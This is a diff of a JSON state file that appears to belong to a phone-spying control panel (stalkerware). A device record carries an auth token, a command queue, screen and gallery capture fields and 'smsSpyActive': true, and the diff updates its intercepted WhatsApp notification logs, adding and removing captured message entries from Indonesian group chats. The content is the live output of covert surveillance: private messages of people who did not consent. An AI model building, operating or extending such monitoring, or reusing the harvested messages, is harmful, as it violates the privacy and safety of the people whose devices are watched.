@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775040744965,
+    "lastSeen": 1775040747458,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14520 pesan dari 11 chat",
+        "time": "01/04 18:52",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040746555
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12173 pesan): ~ syafa karamoy",
@@ -4011,14 +4019,6 @@
         "time": "01/04 18:33",
         "pkg": "com.whatsapp",
         "receivedAt": 1775039602828
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ISIAN ZAYN X OWN [2] (1907 pesan): ~ .",
-        "content": "Npt kayu",
-        "time": "01/04 18:33",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775039602781
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14520 pesan dari 11 chat",
+        "time": "01/04 18:52",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040747474
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12173 pesan): ~ syafa karamoy",
